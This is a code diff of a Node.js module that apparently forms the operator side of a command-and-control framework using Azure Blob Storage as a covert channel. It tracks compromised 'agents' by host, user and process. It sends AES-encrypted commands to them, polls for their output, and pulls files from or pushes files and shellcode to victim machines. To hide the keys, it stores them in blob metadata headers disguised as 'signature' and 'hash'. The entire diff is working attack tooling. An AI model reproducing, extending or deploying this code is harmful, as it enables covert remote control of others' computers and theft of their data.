@@ -7,6 +7,32 @@ const { log } = require('console');
 const { getAppDataDir } = require('./common');
 const directories       = getAppDataDir();
 
+class Agent {
+  constructor() {
+      this.agentid = '';
+      this.arch = '';
+      this.container = '';
+      this.hostname = '';
+      this.IP = [];
+      this.osRelease = '';
+      this.osType = '';
+      this.PID = null;
+      this.platform = '';
+      this.Process = '';
+      this.username = '';
+      this.checkin = Date.now();
+      this.tasks = [];
+      this.aes = {
+          'key': null,
+          'iv': null
+      }; 
+      this.blobs = {
+          'checkin': null,
+          'in': null
+      };
+  }
+}
+
 function decodeBase64(base64) {
   const buffer = Buffer.from(base64, 'base64');
   return buffer.toString('utf-8');
@@ -15,14 +41,14 @@ function encodeBase64(input) {
   const buffer = Buffer.from(input, 'utf-8');
   return buffer.toString('base64');
 }
-async function aesEncrypt(data,key,iv) {
+async function aesEncrypt(data, key, iv) {
   const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
 
   let encrypted = "";
-  if ( Buffer.isBuffer( data ) ) {
+  if (Buffer.isBuffer(data)) {
     encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
   }
-  else { 
+  else {
     encrypted = cipher.update(data, 'utf8', 'hex');
     encrypted += cipher.final('hex');
   }
@@ -45,7 +71,7 @@ async function aesDecrypt(encryptedData, key, iv) {
   }
   return decrypted;
 }
-async function DeleteStorageContainer(StorageContainer,config)
+async function DeleteStorageContainer(StorageContainer)
 {
     let options = {
       hostname: global.config.storageAccount,
@@ -59,8 +85,7 @@ async function DeleteStorageContainer(StorageContainer,config)
     };
     return await makeRequest(options);
 }
-// no deps
-async function DeleteStorageBlob(StorageContainer,StorageBlob,config)
+async function DeleteStorageBlob(StorageContainer,StorageBlob)
 {
     let options = {
       hostname: global.config.storageAccount,
@@ -73,7 +98,7 @@ async function DeleteStorageBlob(StorageContainer,StorageBlob,config)
     };
     return await makeRequest(options);
 }
-async function preloadContainers(metaContainer,config)
+async function preloadContainers()
 {
     let meta_agent_container_info = [];
     log(`azure.js | preloadContainers() | global.config: ${JSON.stringify(global.config)}`);
@@ -98,7 +123,7 @@ async function preloadContainers(metaContainer,config)
           for (const blob of blobs) {
               try
               {
-                let agent_container = await readBlob(global.config.metaContainer,blob,config);
+                let agent_container = await readBlob(global.config.metaContainer,blob);
                 if(agent_container.status === 200)
                 {
                   let this_agent_info = {
@@ -118,58 +143,36 @@ async function preloadContainers(metaContainer,config)
           return null;
       }
 }
-class Agent {
-  constructor() {
-      this.agentid = '';
-      this.arch = '';
-      this.container = '';
-      this.hostname = '';
-      this.IP = [];
-      this.osRelease = '';
-      this.osType = '';
-      this.PID = null;
-      this.platform = '';
-      this.Process = '';
-      this.username = '';
-      this.checkin = Date.now();
-      this.aes = {
-          'key': null,
-          'iv': null
-      }; 
-      this.blobs = {
-          'key': null,
-          'checkin': null,
-          'in': null,
-          'out': null
-      };
-  }
-}
-async function updateDashboardTable(containerName,config)
+
+async function updateDashboardTable()
 {
     let agentcheckins = [];
     try {
         let thisAgent = null;
         let agentObj  = null;
-        let MetaBlobs = await list_blobs(global.config.metaContainer,config);
+        let MetaBlobs = await list_blobs(global.config.metaContainer);
         for (const agentMetaBlob of MetaBlobs) 
         {
             try
             {
               if(global.agents.find(agent => agent.agentid === agentMetaBlob)){
-                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | [!] Agent ${agentMetaBlob} already exists in global.agents`);
                 thisAgent = global.agents.find(agent => agent.agentid === agentMetaBlob);
-                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | Found existing agent object: ${JSON.stringify(thisAgent)}`);
               }
               else{
-                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | [!] Agent ${agentMetaBlob} does not exist in global.agents`);
                 thisAgent = new Agent();
                 thisAgent.agentid = agentMetaBlob;
-                let metaAgentResponse = await readBlob(global.config.metaContainer,agentMetaBlob,config);
+                thisAgent.aes = await getContainerAesKeys(thisAgent.agentid);
+                if(thisAgent.aes == null){ continue; }
+                let metaAgentResponse = await readBlob(global.config.metaContainer,agentMetaBlob);
+                if(metaAgentResponse.status != 200 || metaAgentResponse.response.data == null){ continue; }
                 thisAgent.container = metaAgentResponse.data;
-                thisAgent.blobs = await getContainerBlobs(thisAgent.container,config);
-                thisAgent.aes = await getContainerAesKeys(thisAgent.container,thisAgent.blobs['key'],config);
-                let checkinData         = await checkinContainer(thisAgent.container, thisAgent.aes, thisAgent.blobs,config);
-                agentObj = JSON.parse(checkinData);
+                thisAgent.blobs = await getContainerBlobs(thisAgent.container);
+                if(thisAgent.blobs == null ){ continue; }
+                let checkinData         = await checkinContainer(thisAgent.container, thisAgent.aes, thisAgent.blobs);
+                if(checkinData == null){ continue; }
+                try {
+                    if (typeof checkinData === 'string') { agentObj = JSON.parse(checkinData); } else { continue; }
+                } catch (error) { continue; }
                 thisAgent.hostname = agentObj.hostname;
                 thisAgent.IP = agentObj.IP;
                 thisAgent.osRelease = agentObj.osRelease;
@@ -179,30 +182,25 @@ async function updateDashboardTable(containerName,config)
                 thisAgent.Process = agentObj.Process;
                 thisAgent.username = agentObj.username;
                 thisAgent.arch = agentObj.arch;
-                global.agents.push(thisAgent);
+                if (global.haltUpdate == false) { global.agents.push(thisAgent); }
               }  
-              let checkinBlobLastModified = await getBlobLastModified(thisAgent.container,thisAgent.blobs['in']);
-              if (!checkinBlobLastModified) 
-              {
-                log(`azure.js | updateDashboardTable() | ${response.status} | [!] Missing Last-Modified header for agent ${agent_container_id}`);
-                thisAgent.checkin = Date.now()-60000;
-                continue;
-              }
+              let checkinBlobLastModified = await getBlobLastModified(global.config.metaContainer,agentMetaBlob);
               const timestamp = new Date(checkinBlobLastModified).getTime(); 
               thisAgent.checkin = timestamp;
               agentcheckins.push(thisAgent); 
             }catch(error)
             {
-              log(`Failed to get checkin from listed agent container ${error.stack}`);
+                log(`Failed to get checkin from listed agent container ${error.stack}`);
+                return 0;
             }
         }
         return JSON.stringify(agentcheckins);
     } catch (error) {
-        console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}\n ${JSON.stringify(agentcheckins)}`);
+        console.error(`Error listing blobs in container: \r\n\t${error.message} \r\n\t${error.stack}\n ${JSON.stringify(agentcheckins)}`);
         return 0;
     }
 }
-async function list_blobs(containerName,config)
+async function list_blobs(containerName)
 {
   try{
     let options = {
@@ -218,7 +216,7 @@ async function list_blobs(containerName,config)
     let blobs = response.data.match(/<Name>([^<]+)<\/Name>/g).map(b => b.replace(/<\/?Name>/g, ''));
     return blobs;
   } catch (error) {
-    console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}`);
+    //console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}`);
     return [];
   }
 }
@@ -237,18 +235,14 @@ async function getBlobLastModified(containerName,blob)
   const lastModified = response.response.headers["last-modified"];
   return lastModified;
 }
-async function returnAgentCheckinInfo(agentContainer,agentInputChannel)
+async function returnAgentCheckinInfo(agentid)
 {
   try{
-      let checkinBlobLastModified = await getBlobLastModified(agentContainer,agentInputChannel);
-      if (!checkinBlobLastModified) 
-      {
-        log(`azure.js | updateDashboardTable() | ${response.status} | [!] Missing Last-Modified header for agent ${agent_container_id}`);
-        thisAgent.checkin = Date.now()-60000;
-      }
+      let checkinBlobLastModified = await getBlobLastModified(global.config.metaContainer,agentid);
       return new Date(checkinBlobLastModified).getTime();  
     } catch (error) {
-        console.error(`returnAgentCheckinInfo() | Error listing blobs in container ${containerName}:`, error.message, error.stack);
+        console.error(`returnAgentCheckinInfo() | Error :`, error.message, error.stack);
+        return 0;
     }
 }
 
@@ -266,9 +260,6 @@ async function makeRequest(options, data = null) {
       const requestId = Date.now().toString();
       // Set up response handler before sending request
       const responseHandler = (event, response) => {
-          // log(`[WEB-REQUEST ] url   : ${url}`);
-          // log(`[WEB-RESPONSE] status: ${response.status}`);
-          // log(`[WEB-RESPONSE] data  : ${response.data}`);
           if (response.error) {
               log(`[WEB-REQUEST] Error: ${response.error}`);
               reject(new Error(response.error));
@@ -308,7 +299,7 @@ async function makeRequest(options, data = null) {
       }, timeout);
   });
 }
-async function UploadBlobToContainer(StorageContainer,StorageBlob,data,config)
+async function UploadBlobToContainer(StorageContainer,StorageBlob,data)
 {
 
     if ( data == null)
@@ -330,7 +321,7 @@ async function UploadBlobToContainer(StorageContainer,StorageBlob,data,config)
     };
     return makeRequest(options,data);
 }
-async function readBlob(StorageContainer, StorageBlob, config) {
+async function readBlob(StorageContainer, StorageBlob) {
   try {
       const options = {
           hostname: global.config.storageAccount,
@@ -352,64 +343,73 @@ async function readBlob(StorageContainer, StorageBlob, config) {
       return null; 
   }
 }
-async function getContainerBlobs(containerName,config)
+async function getContainerBlobs(containerName)
 {
     let inputBlob  = "";
-    let outputBlob = "";
     let checkinBlob = "";
-    let keyBlob = "";
     try {
 
-        let agent_blobs = await list_blobs(containerName,config);
+        let agent_blobs = await list_blobs(containerName);
+        if(agent_blobs == null){
+          return false;
+        }
         for (const blob of agent_blobs)
         {
             if (blob.startsWith('i-')) {
                 inputBlob = blob;
             }
-            if (blob.startsWith('o-')) {
-                outputBlob = blob;
-            }
             if (blob.startsWith('c-')) {
                 checkinBlob = blob;
             }
-            if (blob.startsWith('k-')) {
-                keyBlob = blob;
-            }
         } 
         const blobs = {
-            'key'     : keyBlob,
             'checkin' : checkinBlob,
             'in'      : inputBlob,
-            'out'     : outputBlob
         };
         return blobs;
     } catch (error) {
         return false;
     }
 }
-async function getContainerAesKeys(containerName,containerKeyBlob,config)
+
+async function getContainerAesKeys(agentid)
 {
-    try {
-        let kBlobContent;
-        kBlobContent = await readBlob(containerName, containerKeyBlob, config);
-        const kBlobJson = JSON.parse(kBlobContent.data);
-        const aes_key = kBlobJson['key']
-        const aes_iv  = kBlobJson['iv']
-        key = {
-            'key':aes_key,
-            'iv':aes_iv
-        }
-        return key;
-    } catch (error) {
-        log(`getContainerAesKeys() | Error listing blobs in container ${containerName}:`, error.message);
-    }
+  try {
+      const options = {
+          hostname: global.config.storageAccount,
+          port: 443,
+          path: `/${global.config.metaContainer}/${agentid}?comp=metadata&${global.config.sasToken}`,
+          method: 'GET',
+          headers: {
+              'x-ms-version': '2022-11-02',
+              'x-ms-date': new Date().toUTCString()
+          }
+      };
+      const response = await makeRequest(options);
+      if(response.response.headers["x-ms-meta-signature"] == null || response.response.headers["x-ms-meta-hash"] == null){
+        return null;
+      }
+      let aes_key = decodeBase64(response.response.headers["x-ms-meta-signature"]);
+      let aes_iv  = decodeBase64(response.response.headers["x-ms-meta-hash"]);
+      let key = {
+        'key':JSON.parse(aes_key),
+        'iv': JSON.parse(aes_iv)
+      }
+      return key;
+  } catch (error) {
+      console.error(`[AESKEYS][!] Error getting aes keys for agent ${agentid}:`, error.message, error.stack);
+      return null; 
+  }
 }
-async function checkinContainer(containerName, aes, blobs,config)
+
+async function checkinContainer(containerName, aes, blobs)
 {
-    const aes_key_bytes = Buffer.from(aes['key'], 'hex');
-    const aes_iv_bytes  = Buffer.from(aes['iv'],  'hex'); 
     try {
-        let checkin         = await readBlob(containerName, blobs['checkin'], config);
+        log(`checkinContainer() | containerName : ${containerName}`);
+        log(`checkinContainer() | aes : ${JSON.stringify(aes)}`);
+        const aes_key_bytes = Buffer.from(aes['key'], 'hex');
+        const aes_iv_bytes  = Buffer.from(aes['iv'],  'hex'); 
+        let checkin         = await readBlob(containerName, blobs['checkin']);
         let enc_checkin     = decodeBase64(checkin.data);
         const dec_checkin   = await aesDecrypt(enc_checkin,aes_key_bytes,aes_iv_bytes);
         if (!dec_checkin) {
@@ -421,9 +421,11 @@ async function checkinContainer(containerName, aes, blobs,config)
         }
     } catch (error) {
         console.error(`Error connecting to container ${containerName}:`, error.message);
+        return null;
     }
 }
-async function clearBlob(StorageContainer, StorageBlob,config) 
+
+async function clearBlob(StorageContainer, StorageBlob) 
 {
   const options = {
     hostname: global.config.storageAccount,
@@ -440,82 +442,81 @@ async function clearBlob(StorageContainer, StorageBlob,config)
   };
   return makeRequest(options);
 }
-async function uploadCommand(containerCmd,config)
+
+async function uploadCommand(agent_object)
 {
-    let containerCommand = JSON.parse(containerCmd);
-    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
-    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
-    const inputblob      = containerCommand.blobs['in'];
-    const outputblob     = containerCommand.blobs['out'];
-    const containerName  = containerCommand.name;
-    console.log(`${inputblob} ${outputblob} ${containerName}`);
-    const encryptedData = await aesEncrypt(containerCommand.cmd,aes_key_bytes,aes_iv_bytes);
-    const b64EncData    = encodeBase64(encryptedData);
-    let response = await UploadBlobToContainer(containerCommand.name,containerCommand.blobs['in'],b64EncData,config);
-    if(response.status != 201)
-    {
-      log(`azure.js | uploadCommand() | ${response.status} | [!] Failed to upload command to container ${containerName}`);
-      return null;
-    }
-    let decrypted_out_data;
-    const startTime = Date.now();
-    let currentTime;
-    let elapsed;
-    while(true)
-    {
-        let command_output = await readBlob(containerCommand.name,containerCommand.blobs['out'],config);
-        if (command_output === null)
-        {
-          return null;
+    const task = agent_object.tasks[agent_object.tasks.length - 1];
+    const key = Buffer.from(agent_object.aes['key']);
+    const iv = Buffer.from(agent_object.aes['iv']);
+
+    // Read the blob first to check if it's empty
+    let blobCheck = await readBlob(agent_object.container, agent_object.blobs['in']);
+    if (blobCheck.status === 200) {
+        if (!blobCheck.data || blobCheck.data.length === 0) {
+            // Blob exists but is empty, proceed with upload
+            const encryptedData = await aesEncrypt(JSON.stringify(task), key, iv);
+            const b64EncData = encodeBase64(encryptedData);
+            let response = await UploadBlobToContainer(agent_object.container, agent_object.blobs['in'], b64EncData);
+            
+            if (response.status != 201) {
+                log(`azure.js | uploadCommand() | ${response.status} | [!] Failed to upload command to container ${agent_object.container}`);
+                return null;
+            }
+
+            let decrypted_out_data;
+            const startTime = Date.now();
+            let currentTime;
+            let elapsed;
+
+            while(true) {
+                let command_output = await readBlob(agent_object.container, task.outputChannel);
+                if (command_output === null) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    continue;
+                }
+                if (command_output['data']) {
+                    let encrypted_out_data = decodeBase64(command_output['data']);
+                    decrypted_out_data = await aesDecrypt(encrypted_out_data, key, iv);
+                    await clearBlob(agent_object.container, task.outputChannel);
+                    await DeleteStorageBlob(agent_object.container, task.outputChannel);
+                    break;
+                }
+                currentTime = Date.now();
+                elapsed = (currentTime - startTime)/1000;
+                let waittime = 1200;
+                if (elapsed > waittime) {
+                    decrypted_out_data = `[!] No response for ${task.taskId} after ${waittime} seconds to output channel ${task.outputChannel}\r\n${task.command}`;
+                    break;
+                }
+            }
+            return decrypted_out_data;
         }
-        if (command_output['data'])
-        {
-            let encrypted_out_data = decodeBase64(command_output['data']);
-            decrypted_out_data = await aesDecrypt(encrypted_out_data,aes_key_bytes,aes_iv_bytes);
-            await clearBlob(containerName,outputblob,config);
-            break;
-        }
-      currentTime = Date.now();
-      elapsed = (currentTime - startTime)/1000;
-      let waittime = 90;
-      if (containerCommand.cmd.includes("scan "))
-        {
-        waittime = 300;
-      }
-      if(elapsed > waittime)
-      {
-        decrypted_out_data = "No response for command.";
-        break;
-      }
     }
-    return decrypted_out_data;
+    return false;
 }
-async function pullDownloadFile(containerCmd,filename,blob,config)
+
+async function pullDownloadFile(agent_object,filename,blob)
 {
   try{
-
     log(`azure.js | pullDownloadFile()`);
-    let StorageAccount = config.storageAccount;
-    let sasToken = config.sasToken;
-    let containerCommand = JSON.parse(containerCmd);
+    const key  = Buffer.from(agent_object.aes['key']);
+    const iv   = Buffer.from(agent_object.aes['iv']);
     let baseFileName = path.basename(filename);
     log(`pullDownloadFile() | filename     : ${filename}`);
     log(`pullDownloadFile() | blob         : ${blob}`);
-    log(`pullDownloadFile() | command info : ${JSON.stringify(containerCommand)}`);
-    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
-    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
     let raw;
     if (!fs.existsSync(directories.downloadsDir)) {
         fs.mkdirSync(directories.downloadsDir, { recursive: true });
     }
     const destPath = path.join(directories.downloadsDir, baseFileName);
-    const url  = `https://${StorageAccount}/${containerCommand.name}/${blob}?${sasToken}`;
+    const url  = `https://${global.config.storageAccount}/${agent_object.container}/${blob}?${global.config.sasToken}`;
     log(`pullDownloadFile() | URL : ${url}`);
     let buffer;
     let index = 1;
     while(true)
     {
         let response = await fetch(url);
+        
         if (!response.ok) {
           log(`pullDownloadFile loop : ${index} | Failed to download file. Sleeping for 3 seconds and trying again. Status: ${response.status} ${response.statusText}`);
           await new Promise(resolve => setTimeout(resolve, 3000));
@@ -527,7 +528,7 @@ async function pullDownloadFile(containerCmd,filename,blob,config)
         }
         index +=1;
     }
-    raw  = await aesDecrypt( buffer, aes_key_bytes, aes_iv_bytes );
+    raw  = await aesDecrypt( buffer, key, iv );
     await fsp.writeFile(destPath, raw, (err) => {
       log(`Error writing file: ${err.stack}`);
     });
@@ -537,18 +538,19 @@ async function pullDownloadFile(containerCmd,filename,blob,config)
       log(`pullDownloadFile() Error: ${error} ${error.stack}`);
     }
 }
-async function uploadSCToAzure(containerCmd, StorageBlob, filePath,config)
-{
-    let StorageAccount = config.storageAccount;
-    let sasToken = config.sasToken;
 
+async function uploadSCToAzure(agent_object, StorageBlob, filePath)
+{
     try {
-      let containerCommand = JSON.parse(containerCmd);
-      const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
-      const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
+      log(`[AZURE][UPLOAD] uploadSCToAzure() | agent_object : ${JSON.stringify(agent_object)}`);
+      log(`[AZURE][UPLOAD] uploadSCToAzure() | StorageBlob : ${StorageBlob}`);
+      log(`[AZURE][UPLOAD] uploadSCToAzure() | filePath : ${filePath}`);
+      const key  = Buffer.from(agent_object.aes['key']);
+      const iv   = Buffer.from(agent_object.aes['iv']);
+
       const fileContent = await fsp.readFile(filePath);
-      const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
-      const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
+      const enc         = await aesEncrypt( fileContent, key, iv );
+      const sasUrl = `https://${global.config.storageAccount}/${agent_object.container}/${StorageBlob}?${global.config.sasToken}`;
       const response = await fetch(sasUrl, {
         port: 443,
         method: 'PUT',
@@ -558,25 +560,21 @@ async function uploadSCToAzure(containerCmd, StorageBlob, filePath,config)
         },
         body: enc
       });
-      log(`response ${response.ok}`);
+      log(`[AZURE][UPLOAD] response ${response.ok}`);
     } catch (error) {
-      output = `Error uploading file to azure : ${error.stack}`;
-      log(`azure.js | uploadSCToAzure()\r\nError ${output}`);
+      log(`[AZURE][UPLOAD] Error uploading file to azure : ${error.stack}`);
     }
 }
-async function uploadFileToAzure(containerCmd, StorageBlob, filePath,config)
-{
-    let StorageAccount = config.storageAccount;
-    let sasToken = config.sasToken;
-    try {
-      let containerCommand = JSON.parse(containerCmd);
-      const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
-      const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
-      const fileContent = await fsp.readFile(filePath);
-      const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
-      const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
-      const response = await fetch(sasUrl, {
 
+async function uploadFileToAzure(agent_object, StorageBlob, filePath)
+{
+    try {
+      const key  = Buffer.from(agent_object.aes['key']);
+      const iv   = Buffer.from(agent_object.aes['iv']);
+      const fileContent = await fsp.readFile(filePath);
+      const enc         = await aesEncrypt( fileContent, key, iv );
+      const sasUrl = `https://${global.config.storageAccount}/${agent_object.container}/${StorageBlob}?${global.config.sasToken}`;
+      const response = await fetch(sasUrl, {
         port: 443,
         method: 'PUT',
         headers: {
@@ -586,8 +584,7 @@ async function uploadFileToAzure(containerCmd, StorageBlob, filePath,config)
         body: enc
       });
     } catch (error) {
-      output = `Error uploading file to azure : ${error.stack}`;
-      log(`azure.js | uploadFileToAzure()\r\nError ${output}`);
+      log(`azure.js | uploadFileToAzure()\r\nError uploading file to azure : ${error.stack}`);
     }
 }
 module.exports = {
